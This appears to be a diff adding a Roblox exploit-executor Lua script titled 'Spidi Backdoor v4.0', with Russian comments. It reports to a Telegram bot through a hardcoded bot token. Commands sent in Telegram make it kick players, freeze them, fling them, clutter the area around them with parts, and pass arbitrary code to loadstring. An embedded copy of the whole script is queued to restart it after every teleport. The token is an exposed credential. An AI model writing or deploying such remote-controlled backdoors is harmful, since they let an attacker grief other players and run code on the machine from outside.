@@ -1,0 +1,709 @@
+--[=[
+  d888b  db    db d888888b      .d888b.      db      db    db  .8b.  
+ 88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
+ 88      88    88    88            odD'      88      88    88 88ooo88 
+ 88  ooo 88    88    88          .88'        88      88    88 88~~~88 
+ 88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88 
+  Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER
+]=]
+
+-- =====================================================
+-- СПИДИ БЭКДОР v4.0 - С РАБОЧИМ АВТО-ЭКСЕКЬЮТОМ
+-- =====================================================
+
+print("[Spidi] ========================================")
+print("[Spidi] 🚀 ЗАПУСК")
+print("[Spidi] ========================================")
+
+repeat wait() until game:IsLoaded()
+print("[Spidi] ✅ Игра загружена")
+
+-- ==================== КОНФИГ ====================
+local BOT_TOKEN = "8778091630:AAEvqz_bo9fat2Or2Q_XYeeMWS2QBFPMRXc"
+local CHAT_ID = nil
+
+-- ==================== СЕРВИСЫ ====================
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local TeleportService = game:GetService("TeleportService")
+local Debris = game:GetService("Debris")
+local Workspace = game:GetService("Workspace")
+local UserInputService = game:GetService("UserInputService")
+
+print("[Spidi] ✅ Сервисы загружены")
+
+-- ==================== HTTP ФУНКЦИЯ ====================
+local function http(method, url, headers, body)
+    local req = syn and syn.request or http and http.request or http_request or fluxus and fluxus.request or request
+    if not req then
+        print("[Spidi] ❌ Нет функции запроса!")
+        return nil
+    end
+    local args = { Url = url, Method = method, Headers = headers or {} }
+    if body then args.Body = body end
+    local ok, res = pcall(req, args)
+    if ok and res then return res else return nil end
+end
+
+-- ==================== TELEGRAM ====================
+local function sendTelegram(text)
+    if not CHAT_ID then return false end
+    print("[Spidi] 📤 "..text)
+    local payload = { chat_id = CHAT_ID, text = text, parse_mode = "HTML" }
+    local res = http("POST", "https://api.telegram.org/bot"..BOT_TOKEN.."/sendMessage",
+        { ["Content-Type"] = "application/json" },
+        HttpService:JSONEncode(payload))
+    return res and res.StatusCode == 200
+end
+
+local function getChatId()
+    print("[Spidi] 🔍 Получение CHAT_ID...")
+    local res = http("GET", "https://api.telegram.org/bot"..BOT_TOKEN.."/getUpdates", {})
+    if res and res.Body then
+        local ok, data = pcall(HttpService.JSONDecode, HttpService, res.Body)
+        if ok and data and data.result and #data.result > 0 then
+            CHAT_ID = data.result[#data.result].message.chat.id
+            print("[Spidi] ✅ CHAT_ID: "..CHAT_ID)
+            return true
+        end
+    end
+    print("[Spidi] ❌ Напиши /start боту")
+    return false
+end
+
+-- ==================== ПОИСК ИГРОКА ====================
+local function findPlayer(part)
+    if not part or part == "" then
+        return nil, "❌ Введи ник"
+    end
+    local lower = part:lower()
+    local matches = {}
+    for _, p in pairs(Players:GetPlayers()) do
+        if p.Name:lower():find(lower, 1, true) or p.DisplayName:lower():find(lower, 1, true) then
+            table.insert(matches, p)
+        end
+    end
+    if #matches == 0 then
+        return nil, "❌ Игрок не найден: "..part
+    elseif #matches == 1 then
+        return matches[1], nil
+    else
+        local names = {}
+        for _, p in pairs(matches) do table.insert(names, p.Name) end
+        return nil, "❌ Найдено несколько: "..table.concat(names, ", ")
+    end
+end
+
+-- ==================== КОМАНДЫ ====================
+local function handleCommand(cmd, args)
+    print("[Spidi] 📨 /"..cmd.." "..table.concat(args, " "))
+    local info = "👤 Hacker228\n🔗 https://www.roblox.com/games/"..game.PlaceId
+
+    if cmd == "start" then
+        sendTelegram("✅ Spidi активирован!\n"..info)
+        return
+    end
+    if cmd == "help" then
+        sendTelegram("📋 Команды:\n/kick, /ban, /message, /fly, /freeze, /unfreeze, /crash, /players, /server, /time, /ping, /rejoin, /execute, /help")
+        return
+    end
+    if cmd == "players" then
+        local list = {}
+        for _, p in pairs(Players:GetPlayers()) do table.insert(list, p.Name) end
+        sendTelegram("👥 Игроков: "..#list.."\n"..table.concat(list, ", "))
+        return
+    end
+    if cmd == "server" then
+        sendTelegram("🖥️ Сервер: "..game.PlaceId.."\nИгроков: "..#Players:GetPlayers())
+        return
+    end
+    if cmd == "time" then
+        local t = os.date("*t")
+        sendTelegram("🕐 "..string.format("%02d:%02d:%02d", t.hour, t.min, t.sec))
+        return
+    end
+    if cmd == "ping" then
+        local net = game:GetService("Stats"):FindFirstChild("Network")
+        if net then
+            local ping = net:FindFirstChild("Ping")
+            if ping then
+                sendTelegram("🏓 Пинг: "..math.floor(ping.Value).."ms")
+                return
+            end
+        end
+        sendTelegram("❌ Не удалось получить пинг")
+        return
+    end
+    if cmd == "rejoin" then
+        sendTelegram("🔄 Перезаход...")
+        TeleportService:Teleport(game.PlaceId, Players.LocalPlayer)
+        return
+    end
+    if cmd == "execute" then
+        local code = table.concat(args, " ", 2)
+        if code == "" then
+            sendTelegram("❌ Введи код: /execute [код]")
+            return
+        end
+        sendTelegram("⏳ Выполнение: <code>"..code.."</code>")
+        local ok, res = pcall(loadstring, code)
+        if ok then
+            sendTelegram("✅ Код выполнен\n"..info)
+        else
+            sendTelegram("❌ Ошибка: <code>"..tostring(res).."</code>")
+        end
+        return
+    end
+
+    -- Команды с игроком
+    local name = args[1]
+    if not name then
+        sendTelegram("❌ Укажи ник")
+        return
+    end
+    local target, err = findPlayer(name)
+    if not target then
+        sendTelegram(err)
+        return
+    end
+
+    if cmd == "kick" then
+        target:Kick("Kicked by Spidi")
+        sendTelegram("✅ Кикнут: <b>"..target.Name.."</b>\n"..info)
+    elseif cmd == "ban" then
+        target:Kick("Banned by Spidi")
+        sendTelegram("✅ Забанен: <b>"..target.Name.."</b>\n"..info)
+    elseif cmd == "message" then
+        local msg = table.concat(args, " ", 2)
+        sendTelegram("✅ Сообщение <b>"..target.Name.."</b>: "..msg.."\n"..info)
+    elseif cmd == "fly" then
+        local char = target.Character
+        if char and char:FindFirstChild("HumanoidRootPart") then
+            local bv = Instance.new("BodyVelocity")
+            bv.MaxForce = Vector3.new(1,1,1) * 1e8
+            bv.Velocity = Vector3.new(0, 50, 0)
+            bv.Parent = char.HumanoidRootPart
+            Debris:AddItem(bv, 5)
+            sendTelegram("✈️ <b>"..target.Name.."</b> полетел!\n"..info)
+        else
+            sendTelegram("❌ Не найден персонаж")
+        end
+    elseif cmd == "freeze" then
+        local char = target.Character
+        if char and char:FindFirstChild("Humanoid") then
+            char.Humanoid.PlatformStand = true
+            sendTelegram("🧊 <b>"..target.Name.."</b> заморожен!\n"..info)
+        else
+            sendTelegram("❌ Не найден персонаж")
+        end
+    elseif cmd == "unfreeze" then
+        local char = target.Character
+        if char and char:FindFirstChild("Humanoid") then
+            char.Humanoid.PlatformStand = false
+            sendTelegram("🔥 <b>"..target.Name.."</b> разморожен!\n"..info)
+        else
+            sendTelegram("❌ Не найден персонаж")
+        end
+    elseif cmd == "crash" then
+        local char = target.Character
+        if char and char:FindFirstChild("HumanoidRootPart") then
+            local pos = char.HumanoidRootPart.Position
+            for i = 1, 50 do
+                local p = Instance.new("Part")
+                p.Size = Vector3.new(5,5,5)
+                p.Position = pos + Vector3.new(math.random(-30,30), math.random(-30,30), math.random(-30,30))
+                p.Anchored = true
+                p.Parent = Workspace
+                Debris:AddItem(p, 2)
+            end
+            sendTelegram("💥 <b>"..target.Name.."</b> крашнут!\n"..info)
+        else
+            sendTelegram("❌ Не найден персонаж")
+        end
+    else
+        sendTelegram("❌ Неизвестная команда. /help")
+    end
+end
+
+-- ==================== ОПРОС TELEGRAM ====================
+local lastUpdateId = 0
+local function poll()
+    local res = http("GET", "https://api.telegram.org/bot"..BOT_TOKEN.."/getUpdates?offset="..(lastUpdateId+1), {})
+    if res and res.Body then
+        local ok, data = pcall(HttpService.JSONDecode, HttpService, res.Body)
+        if ok and data and data.result then
+            for _, upd in pairs(data.result) do
+                if upd.message and upd.message.text then
+                    local msg = upd.message
+                    local text = msg.text
+                    if not CHAT_ID then
+                        CHAT_ID = msg.chat.id
+                        print("[Spidi] ✅ CHAT_ID: "..CHAT_ID)
+                        sendTelegram("✅ Spidi активирован!\n👤 Hacker228\n🔗 https://www.roblox.com/games/"..game.PlaceId)
+                    end
+                    if text:sub(1,1) == "/" then
+                        local parts = {}
+                        for w in string.gmatch(text, "%S+") do table.insert(parts, w) end
+                        local cmd = parts[1]:sub(2):lower()
+                        table.remove(parts, 1)
+                        handleCommand(cmd, parts)
+                    end
+                end
+                if upd.update_id then lastUpdateId = upd.update_id end
+            end
+        end
+    end
+end
+
+spawn(function()
+    while true do
+        pcall(poll)
+        wait(2)
+    end
+end)
+
+-- ==================== GUI ====================
+local function createGUI()
+    print("[Spidi] 🎨 Создание GUI...")
+    local player = Players.LocalPlayer
+    local gui = player:FindFirstChild("PlayerGui")
+    if not gui then
+        gui = Instance.new("PlayerGui")
+        gui.Parent = player
+    end
+    local screen = Instance.new("ScreenGui")
+    screen.Name = "Spidi Backdoor"
+    screen.ResetOnSpawn = false
+    screen.Parent = gui
+
+    local frame = Instance.new("Frame")
+    frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    frame.Size = UDim2.new(0, 482, 0, 276)
+    frame.Position = UDim2.new(0.5, -241, 0.5, -138)
+    frame.Active = true
+    frame.Parent = screen
+
+    local stroke = Instance.new("UIStroke")
+    stroke.Thickness = 2
+    stroke.Color = Color3.fromRGB(255, 255, 255)
+    stroke.Parent = frame
+
+    local grad = Instance.new("UIGradient")
+    grad.Rotation = 50
+    grad.Color = ColorSequence.new({
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 255, 0))
+    })
+    grad.Parent = stroke
+
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 12)
+    corner.Parent = frame
+
+    local title = Instance.new("TextLabel")
+    title.BackgroundTransparency = 1
+    title.Size = UDim2.new(1, 0, 0, 50)
+    title.Position = UDim2.new(0, 0, 0, 10)
+    title.Text = "Spidi Backdoor"
+    title.TextColor3 = Color3.fromRGB(0, 255, 0)
+    title.TextSize = 36
+    title.Font = Enum.Font.GothamBold
+    title.TextXAlignment = Enum.TextXAlignment.Center
+    title.Parent = frame
+
+    local desc = Instance.new("TextLabel")
+    desc.BackgroundTransparency = 1
+    desc.Size = UDim2.new(1, -40, 0, 80)
+    desc.Position = UDim2.new(0, 20, 0, 70)
+    desc.Text = "Spidi Backdoor Active!\nTelegram Bot Connected"
+    desc.TextColor3 = Color3.fromRGB(0, 255, 0)
+    desc.TextSize = 18
+    desc.Font = Enum.Font.GothamBold
+    desc.TextWrapped = true
+    desc.TextXAlignment = Enum.TextXAlignment.Center
+    desc.Parent = frame
+
+    local btn = Instance.new("TextButton")
+    btn.BackgroundColor3 = Color3.fromRGB(60, 60, 80)
+    btn.Size = UDim2.new(0, 140, 0, 40)
+    btn.Position = UDim2.new(0.5, -70, 0.75, 0)
+    btn.Text = "OK"
+    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    btn.TextSize = 18
+    btn.Font = Enum.Font.GothamBold
+    btn.Parent = frame
+
+    local btnCorner = Instance.new("UICorner")
+    btnCorner.CornerRadius = UDim.new(0, 6)
+    btnCorner.Parent = btn
+
+    btn.MouseButton1Click:Connect(function() screen:Destroy() end)
+
+    local drag = false
+    local startPos, startMouse, dragInput
+    frame.InputBegan:Connect(function(inp)
+        if (inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch) and not UserInputService:GetFocusedTextBox() then
+            drag = true
+            startPos = frame.Position
+            startMouse = inp.Position
+            inp.Changed:Connect(function()
+                if inp.UserInputState == Enum.UserInputState.End then drag = false end
+            end)
+        end
+    end)
+    frame.InputChanged:Connect(function(inp)
+        if inp.UserInputType == Enum.UserInputType.MouseMovement or inp.UserInputType == Enum.UserInputType.Touch then
+            dragInput = inp
+        end
+    end)
+    UserInputService.InputChanged:Connect(function(inp)
+        if inp == dragInput and drag then
+            local delta = inp.Position - startMouse
+            frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+        end
+    end)
+
+    print("[Spidi] ✅ GUI создан")
+end
+
+-- =====================================================
+-- АВТО-ЭКСЕКЬЮТ (РАБОЧИЙ)
+-- =====================================================
+local function autoExecute()
+    print("[Spidi] 🔄 Настройка авто-эксекьюта...")
+    
+    local queue = syn and syn.queue_on_teleport or queue_on_teleport or fluxus and fluxus.queue_on_teleport
+    
+    if queue then
+        print("[Spidi] ✅ queue_on_teleport НАЙДЕН")
+        
+        -- Весь код скрипта (без autoExecute)
+        local fullScript = [=[
+--[=[
+  d888b  db    db d888888b      .d888b.      db      db    db  .8b.  
+ 88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
+ 88      88    88    88            odD'      88      88    88 88ooo88 
+ 88  ooo 88    88    88          .88'        88      88    88 88~~~88 
+ 88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88 
+  Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER
+]=]
+
+repeat wait() until game:IsLoaded()
+
+local BOT_TOKEN = "8778091630:AAEvqz_bo9fat2Or2Q_XYeeMWS2QBFPMRXc"
+local CHAT_ID = nil
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local TeleportService = game:GetService("TeleportService")
+local Debris = game:GetService("Debris")
+local Workspace = game:GetService("Workspace")
+local UserInputService = game:GetService("UserInputService")
+
+local function http(method, url, headers, body)
+    local req = syn and syn.request or http and http.request or http_request or fluxus and fluxus.request or request
+    if not req then return nil end
+    local args = { Url = url, Method = method, Headers = headers or {} }
+    if body then args.Body = body end
+    local ok, res = pcall(req, args)
+    if ok and res then return res else return nil end
+end
+
+local function sendTelegram(text)
+    if not CHAT_ID then return false end
+    local payload = { chat_id = CHAT_ID, text = text, parse_mode = "HTML" }
+    http("POST", "https://api.telegram.org/bot"..BOT_TOKEN.."/sendMessage",
+        { ["Content-Type"] = "application/json" },
+        HttpService:JSONEncode(payload))
+    return true
+end
+
+local function getChatId()
+    local res = http("GET", "https://api.telegram.org/bot"..BOT_TOKEN.."/getUpdates", {})
+    if res and res.Body then
+        local ok, data = pcall(HttpService.JSONDecode, HttpService, res.Body)
+        if ok and data and data.result and #data.result > 0 then
+            CHAT_ID = data.result[#data.result].message.chat.id
+            return true
+        end
+    end
+    return false
+end
+
+local function findPlayer(part)
+    if not part or part == "" then return nil, "❌ Введи ник" end
+    local lower = part:lower()
+    local matches = {}
+    for _, p in pairs(Players:GetPlayers()) do
+        if p.Name:lower():find(lower, 1, true) or p.DisplayName:lower():find(lower, 1, true) then
+            table.insert(matches, p)
+        end
+    end
+    if #matches == 0 then return nil, "❌ Игрок не найден: "..part
+    elseif #matches == 1 then return matches[1], nil
+    else
+        local names = {}
+        for _, p in pairs(matches) do table.insert(names, p.Name) end
+        return nil, "❌ Найдено несколько: "..table.concat(names, ", ")
+    end
+end
+
+local function handleCommand(cmd, args)
+    local info = "👤 Hacker228\n🔗 https://www.roblox.com/games/"..game.PlaceId
+    if cmd == "start" then sendTelegram("✅ Spidi активирован!\n"..info) return end
+    if cmd == "help" then
+        sendTelegram("📋 Команды:\n/kick, /ban, /message, /fly, /freeze, /unfreeze, /crash, /players, /server, /time, /ping, /rejoin, /execute, /help")
+        return
+    end
+    if cmd == "players" then
+        local list = {}
+        for _, p in pairs(Players:GetPlayers()) do table.insert(list, p.Name) end
+        sendTelegram("👥 Игроков: "..#list.."\n"..table.concat(list, ", "))
+        return
+    end
+    if cmd == "server" then
+        sendTelegram("🖥️ Сервер: "..game.PlaceId.."\nИгроков: "..#Players:GetPlayers())
+        return
+    end
+    if cmd == "time" then
+        local t = os.date("*t")
+        sendTelegram("🕐 "..string.format("%02d:%02d:%02d", t.hour, t.min, t.sec))
+        return
+    end
+    if cmd == "ping" then
+        local net = game:GetService("Stats"):FindFirstChild("Network")
+        if net then
+            local ping = net:FindFirstChild("Ping")
+            if ping then sendTelegram("🏓 Пинг: "..math.floor(ping.Value).."ms") return end
+        end
+        sendTelegram("❌ Не удалось получить пинг")
+        return
+    end
+    if cmd == "rejoin" then
+        sendTelegram("🔄 Перезаход...")
+        TeleportService:Teleport(game.PlaceId, Players.LocalPlayer)
+        return
+    end
+    if cmd == "execute" then
+        local code = table.concat(args, " ", 2)
+        if code == "" then sendTelegram("❌ Введи код: /execute [код]") return end
+        sendTelegram("⏳ Выполнение: <code>"..code.."</code>")
+        local ok, res = pcall(loadstring, code)
+        if ok then sendTelegram("✅ Код выполнен\n"..info) else sendTelegram("❌ Ошибка: <code>"..tostring(res).."</code>") end
+        return
+    end
+    local name = args[1]
+    if not name then sendTelegram("❌ Укажи ник") return end
+    local target, err = findPlayer(name)
+    if not target then sendTelegram(err) return end
+    if cmd == "kick" then
+        target:Kick("Kicked by Spidi")
+        sendTelegram("✅ Кикнут: <b>"..target.Name.."</b>\n"..info)
+    elseif cmd == "ban" then
+        target:Kick("Banned by Spidi")
+        sendTelegram("✅ Забанен: <b>"..target.Name.."</b>\n"..info)
+    elseif cmd == "message" then
+        local msg = table.concat(args, " ", 2)
+        sendTelegram("✅ Сообщение <b>"..target.Name.."</b>: "..msg.."\n"..info)
+    elseif cmd == "fly" then
+        local char = target.Character
+        if char and char:FindFirstChild("HumanoidRootPart") then
+            local bv = Instance.new("BodyVelocity")
+            bv.MaxForce = Vector3.new(1,1,1) * 1e8
+            bv.Velocity = Vector3.new(0, 50, 0)
+            bv.Parent = char.HumanoidRootPart
+            Debris:AddItem(bv, 5)
+            sendTelegram("✈️ <b>"..target.Name.."</b> полетел!\n"..info)
+        else sendTelegram("❌ Не найден персонаж") end
+    elseif cmd == "freeze" then
+        local char = target.Character
+        if char and char:FindFirstChild("Humanoid") then
+            char.Humanoid.PlatformStand = true
+            sendTelegram("🧊 <b>"..target.Name.."</b> заморожен!\n"..info)
+        else sendTelegram("❌ Не найден персонаж") end
+    elseif cmd == "unfreeze" then
+        local char = target.Character
+        if char and char:FindFirstChild("Humanoid") then
+            char.Humanoid.PlatformStand = false
+            sendTelegram("🔥 <b>"..target.Name.."</b> разморожен!\n"..info)
+        else sendTelegram("❌ Не найден персонаж") end
+    elseif cmd == "crash" then
+        local char = target.Character
+        if char and char:FindFirstChild("HumanoidRootPart") then
+            local pos = char.HumanoidRootPart.Position
+            for i = 1, 50 do
+                local p = Instance.new("Part")
+                p.Size = Vector3.new(5,5,5)
+                p.Position = pos + Vector3.new(math.random(-30,30), math.random(-30,30), math.random(-30,30))
+                p.Anchored = true
+                p.Parent = Workspace
+                Debris:AddItem(p, 2)
+            end
+            sendTelegram("💥 <b>"..target.Name.."</b> крашнут!\n"..info)
+        else sendTelegram("❌ Не найден персонаж") end
+    else sendTelegram("❌ Неизвестная команда. /help") end
+end
+
+local lastUpdateId = 0
+local function poll()
+    local res = http("GET", "https://api.telegram.org/bot"..BOT_TOKEN.."/getUpdates?offset="..(lastUpdateId+1), {})
+    if res and res.Body then
+        local ok, data = pcall(HttpService.JSONDecode, HttpService, res.Body)
+        if ok and data and data.result then
+            for _, upd in pairs(data.result) do
+                if upd.message and upd.message.text then
+                    local msg = upd.message
+                    local text = msg.text
+                    if not CHAT_ID then
+                        CHAT_ID = msg.chat.id
+                        sendTelegram("✅ Spidi активирован!\n👤 Hacker228\n🔗 https://www.roblox.com/games/"..game.PlaceId)
+                    end
+                    if text:sub(1,1) == "/" then
+                        local parts = {}
+                        for w in string.gmatch(text, "%S+") do table.insert(parts, w) end
+                        local cmd = parts[1]:sub(2):lower()
+                        table.remove(parts, 1)
+                        handleCommand(cmd, parts)
+                    end
+                end
+                if upd.update_id then lastUpdateId = upd.update_id end
+            end
+        end
+    end
+end
+
+spawn(function()
+    while true do
+        pcall(poll)
+        wait(2)
+    end
+end)
+
+local function createGUI()
+    local player = Players.LocalPlayer
+    local gui = player:FindFirstChild("PlayerGui")
+    if not gui then gui = Instance.new("PlayerGui", player) end
+    local screen = Instance.new("ScreenGui")
+    screen.Name = "Spidi Backdoor"
+    screen.ResetOnSpawn = false
+    screen.Parent = gui
+    local frame = Instance.new("Frame")
+    frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    frame.Size = UDim2.new(0, 482, 0, 276)
+    frame.Position = UDim2.new(0.5, -241, 0.5, -138)
+    frame.Active = true
+    frame.Parent = screen
+    local stroke = Instance.new("UIStroke")
+    stroke.Thickness = 2
+    stroke.Color = Color3.fromRGB(255, 255, 255)
+    stroke.Parent = frame
+    local grad = Instance.new("UIGradient")
+    grad.Rotation = 50
+    grad.Color = ColorSequence.new({
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 255, 0))
+    })
+    grad.Parent = stroke
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 12)
+    corner.Parent = frame
+    local title = Instance.new("TextLabel")
+    title.BackgroundTransparency = 1
+    title.Size = UDim2.new(1, 0, 0, 50)
+    title.Position = UDim2.new(0, 0, 0, 10)
+    title.Text = "Spidi Backdoor"
+    title.TextColor3 = Color3.fromRGB(0, 255, 0)
+    title.TextSize = 36
+    title.Font = Enum.Font.GothamBold
+    title.TextXAlignment = Enum.TextXAlignment.Center
+    title.Parent = frame
+    local desc = Instance.new("TextLabel")
+    desc.BackgroundTransparency = 1
+    desc.Size = UDim2.new(1, -40, 0, 80)
+    desc.Position = UDim2.new(0, 20, 0, 70)
+    desc.Text = "Spidi Backdoor Active!\nTelegram Bot Connected"
+    desc.TextColor3 = Color3.fromRGB(0, 255, 0)
+    desc.TextSize = 18
+    desc.Font = Enum.Font.GothamBold
+    desc.TextWrapped = true
+    desc.TextXAlignment = Enum.TextXAlignment.Center
+    desc.Parent = frame
+    local btn = Instance.new("TextButton")
+    btn.BackgroundColor3 = Color3.fromRGB(60, 60, 80)
+    btn.Size = UDim2.new(0, 140, 0, 40)
+    btn.Position = UDim2.new(0.5, -70, 0.75, 0)
+    btn.Text = "OK"
+    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    btn.TextSize = 18
+    btn.Font = Enum.Font.GothamBold
+    btn.Parent = frame
+    local btnCorner = Instance.new("UICorner")
+    btnCorner.CornerRadius = UDim.new(0, 6)
+    btnCorner.Parent = btn
+    btn.MouseButton1Click:Connect(function() screen:Destroy() end)
+    local drag = false
+    local startPos, startMouse, dragInput
+    frame.InputBegan:Connect(function(inp)
+        if (inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch) and not UserInputService:GetFocusedTextBox() then
+            drag = true
+            startPos = frame.Position
+            startMouse = inp.Position
+            inp.Changed:Connect(function()
+                if inp.UserInputState == Enum.UserInputState.End then drag = false end
+            end)
+        end
+    end)
+    frame.InputChanged:Connect(function(inp)
+        if inp.UserInputType == Enum.UserInputType.MouseMovement or inp.UserInputType == Enum.UserInputType.Touch then
+            dragInput = inp
+        end
+    end)
+    UserInputService.InputChanged:Connect(function(inp)
+        if inp == dragInput and drag then
+            local delta = inp.Position - startMouse
+            frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+        end
+    end)
+end
+
+createGUI()
+getChatId()
+
+print("[Spidi] ✅ Авто-запуск выполнен!")
+]=]
+
+        queue("loadstring([[" .. fullScript .. "]])()")
+        print("[Spidi] ✅ Скрипт поставлен в очередь!")
+        return true
+    else
+        print("[Spidi] ❌ queue_on_teleport НЕ НАЙДЕН")
+        return false
+    end
+end
+
+-- =====================================================
+-- ЗАПУСК
+-- =====================================================
+createGUI()
+autoExecute()
+
+wait(3)
+
+local attempts = 0
+while not CHAT_ID and attempts < 5 do
+    attempts = attempts + 1
+    print("[Spidi] 🔄 Попытка "..attempts.."/5")
+    getChatId()
+    if not CHAT_ID then wait(2) end
+end
+
+if CHAT_ID then
+    print("[Spidi] ========================================")
+    print("[Spidi] ✅ СКРИПТ ЗАПУЩЕН!")
+    print("[Spidi] 📌 Напиши /help в Telegram")
+    print("[Spidi] ========================================")
+    sendTelegram("✅ Spidi Backdoor запущен!\n👤 Hacker228\n🔗 https://www.roblox.com/games/"..game.PlaceId)
+else
+    print("[Spidi] ========================================")
+    print("[Spidi] ⚠️ Напиши /start боту в Telegram")
+    print("[Spidi] ========================================")
+end
